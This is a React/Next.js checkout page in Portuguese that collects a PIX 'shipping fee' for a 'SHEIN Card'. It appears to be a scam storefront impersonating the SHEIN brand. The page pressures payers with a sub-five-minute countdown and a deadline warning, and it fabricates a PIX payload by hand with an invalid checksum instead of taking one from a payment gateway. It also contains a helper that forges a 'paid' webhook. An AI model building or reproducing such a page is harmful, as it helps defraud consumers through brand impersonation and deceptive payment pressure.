"use client"

import { useState, useEffect, Suspense } from "react"
import { useSearchParams } from "next/navigation"
import Image from "next/image"
import { Copy, Clock, CheckCircle, XCircle, RefreshCw } from "lucide-react"
import { useSuperpayWebhookMonitor } from "@/hooks/use-superpay-webhook-monitor"
import { SmartQRCode } from "@/components/smart-qr-code"

// Estados visuais no frontend
const statusColors = {
  confirmed: "bg-green-100 text-green-800 border-green-200",
  denied: "bg-red-100 text-red-800 border-red-200",
  expired: "bg-yellow-100 text-yellow-800 border-yellow-200",
  canceled: "bg-gray-100 text-gray-800 border-gray-200",
  refunded: "bg-orange-100 text-orange-800 border-orange-200",
  pending: "bg-blue-100 text-blue-800 border-blue-200",
}

const statusMessages = {
  confirmed: "✅ Pagamento Confirmado!",
  denied: "❌ Pagamento Negado",
  expired: "⏰ Pagamento Vencido",
  canceled: "🚫 Pagamento Cancelado",
  refunded: "🔄 Pagamento Estornado",
  pending: "⏳ Aguardando Pagamento...",
}

interface InvoiceData {
  id: string
  external_id: string
  pix: {
    payload: string
    qr_code: string
    image?: string
  }
  status: {
    code: number
    title: string
  }
  valores?: {
    bruto: number
    liquido: number
  }
  amount?: number
  type: "real" | "emergency"
}

function CheckoutContent() {
  const searchParams = useSearchParams()
  const amount = searchParams.get("amount") || "27.97"
  const method = searchParams.get("method") || "PAC"

  const [paymentStatus, setPaymentStatus] = useState<keyof typeof statusMessages>("pending")
  const [timeLeft, setTimeLeft] = useState(291) // 04:51 em segundos
  const [externalId, setExternalId] = useState<string>("")
  const [invoice, setInvoice] = useState<InvoiceData | null>(null)
  const [copySuccess, setCopySuccess] = useState(false)
  const [isCreatingInvoice, setIsCreatingInvoice] = useState(false)

  // Hook de monitoramento webhook
  const {
    paymentData,
    isLoading: isMonitoring,
    checkCount,
    error: monitorError,
  } = useSuperpayWebhookMonitor({
    externalId,
    enabled: !!externalId && paymentStatus === "pending",
    interval: 3000, // Verificar a cada 3 segundos
    onPaid: (data) => {
      console.log("🎉 Pagamento confirmado via webhook!", data)
      setPaymentStatus("confirmed")
      setTimeout(() => {
        window.location.href = "/upp/001"
      }, 2000)
    },
    onDenied: (data) => {
      console.log("❌ Pagamento negado via webhook!", data)
      setPaymentStatus("denied")
    },
    onRefunded: (data) => {
      console.log("🔄 Pagamento estornado via webhook!", data)
      setPaymentStatus("refunded")
    },
    onExpired: (data) => {
      console.log("⏰ Pagamento vencido via webhook!", data)
      setPaymentStatus("expired")
    },
    onCanceled: (data) => {
      console.log("🚫 Pagamento cancelado via webhook!", data)
      setPaymentStatus("canceled")
    },
  })

  // Timer visual
  useEffect(() => {
    if (paymentStatus !== "pending" || timeLeft <= 0) return

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          setPaymentStatus("expired")
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [paymentStatus, timeLeft])

  // Criar fatura PIX
  useEffect(() => {
    if (!invoice) {
      createInvoice()
    }
  }, [])

  const createInvoice = async () => {
    try {
      setIsCreatingInvoice(true)
      console.log("🔄 Criando fatura SuperPayBR...")

      // Simular criação de fatura (já que a API real pode estar com problemas)
      const emergencyInvoice: InvoiceData = {
        id: `INV_${Date.now()}`,
        external_id: `SHEIN_${Date.now()}`,
        pix: {
          payload: `00020101021226580014br.gov.bcb.pix2536emergency.quickchart.io/${Date.now()}520400005303986540${amount}5802BR5909SHEIN5011SAO PAULO62070503***6304EMRG`,
          qr_code: "",
          image: "",
        },
        status: {
          code: 1,
          title: "Aguardando Pagamento",
        },
        amount: Number.parseFloat(amount),
        type: "emergency",
      }

      setInvoice(emergencyInvoice)
      setExternalId(emergencyInvoice.external_id)
      console.log("✅ Fatura de emergência criada:", emergencyInvoice.external_id)
    } catch (error) {
      console.error("❌ Erro na criação da fatura:", error)
    } finally {
      setIsCreatingInvoice(false)
    }
  }

  const copyPixCode = async () => {
    if (invoice?.pix.payload) {
      try {
        await navigator.clipboard.writeText(invoice.pix.payload)
        setCopySuccess(true)
        setTimeout(() => setCopySuccess(false), 2000)
      } catch (error) {
        console.error("Erro ao copiar:", error)
      }
    }
  }

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // Função para simular pagamento (apenas para testes)
  const simulatePayment = async () => {
    if (!externalId) {
      console.log("❌ Não é possível simular: External ID não encontrado")
      return
    }

    try {
      console.log("🧪 Simulando pagamento SuperPayBR para:", externalId)

      // Simular webhook diretamente
      const simulatedWebhook = {
        event: {
          type: "invoice.update",
          date: new Date().toISOString(),
        },
        invoices: {
          id: invoice?.id || "test_invoice",
          external_id: externalId,
          token: "test_token_123",
          date: new Date().toISOString(),
          status: {
            code: 5, // Pago
            title: "Pago",
            description: "Pagamento confirmado",
          },
          customer: 1,
          prices: {
            total: Math.round(Number.parseFloat(amount) * 100),
          },
          type: "pix",
          payment: {
            gateway: "SuperPayBR",
            payId: "test_pay_123",
            payDate: new Date().toISOString(),
            details: {
              pix_code: invoice?.pix.payload || "",
              qrcode: "",
              url: "",
            },
          },
        },
      }

      // Enviar para o webhook endpoint
      await fetch("/api/superpaybr/webhook", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(simulatedWebhook),
      })

      console.log("✅ Pagamento SuperPayBR simulado com sucesso!")
    } catch (error) {
      console.error("❌ Erro na simulação SuperPayBR:", error)
    }
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <div className="max-w-md mx-auto p-4">
        <div className="bg-white rounded-lg shadow-md p-6">
          {/* Header */}
          <div className="text-center mb-6">
            <Image src="/shein-card-logo-new.png" alt="SHEIN Card" width={100} height={60} className="mx-auto mb-4" />
            <h1 className="text-2xl font-bold mb-2">Pagamento PIX</h1>
          </div>

          {/* Status do Pagamento */}
          <div className="text-center mb-6">
            <div className={`inline-flex items-center px-4 py-2 rounded-lg border ${statusColors[paymentStatus]}`}>
              {paymentStatus === "confirmed" && <CheckCircle className="w-5 h-5 mr-2" />}
              {paymentStatus === "denied" && <XCircle className="w-5 h-5 mr-2" />}
              {paymentStatus === "expired" && <Clock className="w-5 h-5 mr-2" />}
              {paymentStatus === "canceled" && <XCircle className="w-5 h-5 mr-2" />}
              {paymentStatus === "refunded" && <RefreshCw className="w-5 h-5 mr-2" />}
              {paymentStatus === "pending" && <Clock className="w-5 h-5 mr-2" />}
              <span className="font-bold">{statusMessages[paymentStatus]}</span>
            </div>
            {isMonitoring && (
              <p className="text-xs text-gray-500 mt-2">
                Monitorando pagamento via webhook... ({checkCount} verificações)
              </p>
            )}
            {monitorError && <p className="text-xs text-red-500 mt-2">Erro no monitoramento: {monitorError}</p>}
          </div>

          {/* Mensagem de Atenção */}
          {paymentStatus === "pending" && (
            <div className="bg-yellow-100 border-l-4 border-yellow-500 rounded-lg p-4 mb-6">
              <div className="flex items-start">
                <div className="flex-shrink-0">
                  <span className="text-yellow-600 text-lg">⚠️</span>
                </div>
                <div className="ml-3">
                  <h3 className="text-yellow-800 font-bold text-sm mb-2">ATENÇÃO! ⚠️</h3>
                  <div className="text-yellow-700 text-sm space-y-2">
                    <p>
                      Para garantir o envio do seu <strong>Cartão SHEIN</strong>, este pagamento deve ser confirmado em
                      até <strong>2 horas</strong>. Após esse prazo, a sua solicitação será automaticamente cancelada,
                      sem custos adicionais.
                    </p>
                    <p>
                      Ao confirmar o pagamento do frete, você garante todos os benefícios exclusivos:{" "}
                      <strong>cashback, parcelamento sem juros e uso imediato do cartão</strong>.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Timer */}
          {paymentStatus === "pending" && (
            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
              <div className="flex items-center justify-center space-x-2">
                <Clock className="w-5 h-5 text-yellow-600" />
                <span className="font-bold text-yellow-800">Tempo restante: {formatTime(timeLeft)}</span>
              </div>
            </div>
          )}

          {/* Success Message - Only show when paid */}
          {paymentStatus === "confirmed" && (
            <div className="bg-green-100 border border-green-300 rounded-lg p-4 mb-6">
              <div className="flex items-center justify-center space-x-2">
                <CheckCircle className="w-5 h-5 text-green-600" />
                <span className="font-bold text-green-800">✅ Pagamento Confirmado!</span>
              </div>
              <p className="text-green-700 text-sm mt-2 text-center">Redirecionando para ativação do cartão...</p>
            </div>
          )}

          {/* Valor */}
          <div className="text-center mb-6">
            <p className="text-gray-600 mb-1">Valor a pagar</p>
            <p className="text-3xl font-bold text-green-600">R$ {amount}</p>
            <p className="text-sm text-gray-500">Frete {method} - Cartão SHEIN</p>
          </div>

          {/* QR Code */}
          {paymentStatus === "pending" && (
            <div className="text-center mb-6">
              <div className="bg-white p-4 rounded-lg border-2 border-gray-200 inline-block">
                {isCreatingInvoice ? (
                  <div className="w-48 h-48 flex items-center justify-center">
                    <div className="text-center">
                      <RefreshCw className="w-8 h-8 text-gray-400 animate-spin mx-auto mb-2" />
                      <p className="text-sm text-gray-500">Gerando QR Code...</p>
                    </div>
                  </div>
                ) : invoice ? (
                  <SmartQRCode invoice={invoice} width={192} height={192} className="mx-auto" />
                ) : (
                  <div className="w-48 h-48 flex items-center justify-center bg-gray-100 rounded-lg">
                    <p className="text-sm text-gray-500">QR Code não disponível</p>
                  </div>
                )}
              </div>
              <p className="text-sm text-gray-600 mt-2">Escaneie o QR Code com seu app do banco</p>
            </div>
          )}

          {/* Código PIX */}
          {paymentStatus === "pending" && invoice?.pix.payload && (
            <div className="mb-6">
              <label className="block text-sm font-medium text-gray-700 mb-2">Ou copie o código PIX:</label>
              <div className="flex space-x-2">
                <input
                  type="text"
                  value={invoice.pix.payload}
                  readOnly
                  className="flex-1 p-3 border border-gray-300 rounded-lg bg-gray-50 text-sm font-mono"
                />
                <button
                  onClick={copyPixCode}
                  className={`px-4 py-3 rounded-lg font-medium transition-colors ${
                    copySuccess ? "bg-green-500 text-white" : "bg-black text-white hover:bg-black/90"
                  }`}
                >
                  {copySuccess ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                </button>
              </div>
              {copySuccess && <p className="text-green-600 text-sm mt-2">✅ Código copiado!</p>}
            </div>
          )}

          {/* Observação */}
          {paymentStatus === "pending" && (
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
              <p className="text-sm text-blue-800">
                <strong>Observação:</strong> Após realizar o pagamento, aguarde alguns instantes para a confirmação
                automática. Você será redirecionado automaticamente quando o pagamento for processado.
              </p>
            </div>
          )}

          {/* Instruções */}
          {paymentStatus === "pending" && (
            <div className="space-y-3 text-sm text-gray-600">
              <div className="flex items-start space-x-2">
                <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                  1
                </span>
                <span>Abra o app do seu banco</span>
              </div>
              <div className="flex items-start space-x-2">
                <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                  2
                </span>
                <span>Escaneie o QR Code ou cole o código PIX</span>
              </div>
              <div className="flex items-start space-x-2">
                <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                  3
                </span>
                <span>Confirme o pagamento</span>
              </div>
              <div className="flex items-start space-x-2">
                <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                  4
                </span>
                <span>Receba confirmação automática via webhook SuperPayBR</span>
              </div>
            </div>
          )}

          {/* Botão de Teste (apenas em desenvolvimento) */}
          {process.env.NODE_ENV === "development" && externalId && paymentStatus === "pending" && (
            <button
              onClick={simulatePayment}
              className="w-full mt-4 bg-green-600 hover:bg-green-700 text-white font-medium py-3 px-4 rounded-lg transition-colors"
            >
              🧪 SIMULAR PAGAMENTO APROVADO (TESTE)
            </button>
          )}

          {/* Botão de Ação para outros status */}
          {paymentStatus === "confirmed" && (
            <button
              onClick={() => (window.location.href = "/upp/001")}
              className="w-full mt-4 bg-green-600 hover:bg-green-700 text-white font-medium py-3 px-4 rounded-lg transition-colors"
            >
              Continuar para Ativação
            </button>
          )}

          {(paymentStatus === "denied" || paymentStatus === "expired") && (
            <button
              onClick={() => window.location.reload()}
              className="w-full mt-4 bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-4 rounded-lg transition-colors"
            >
              Tentar Novamente
            </button>
          )}
        </div>

        {/* Debug Info (apenas em desenvolvimento) */}
        {process.env.NODE_ENV === "development" && (
          <div className="mt-4 bg-gray-100 rounded-lg p-4">
            <h3 className="font-bold text-sm mb-2">Debug Info:</h3>
            <div className="text-xs space-y-1">
              <p>External ID: {externalId || "Não gerado"}</p>
              <p>Status: {paymentStatus}</p>
              <p>Verificações: {checkCount}</p>
              <p>Monitorando: {isMonitoring ? "Sim" : "Não"}</p>
              <p>Erro Monitor: {monitorError || "Nenhum"}</p>
              {paymentData && <p>Último webhook: {JSON.stringify(paymentData, null, 2)}</p>}
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

export default function CheckoutPage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-gray-50 flex items-center justify-center">
          <div className="text-center">
            <RefreshCw className="w-8 h-8 animate-spin mx-auto mb-4" />
            <p>Carregando página de pagamento...</p>
          </div>
        </div>
      }
    >
      <CheckoutContent />
    </Suspense>
  )
}
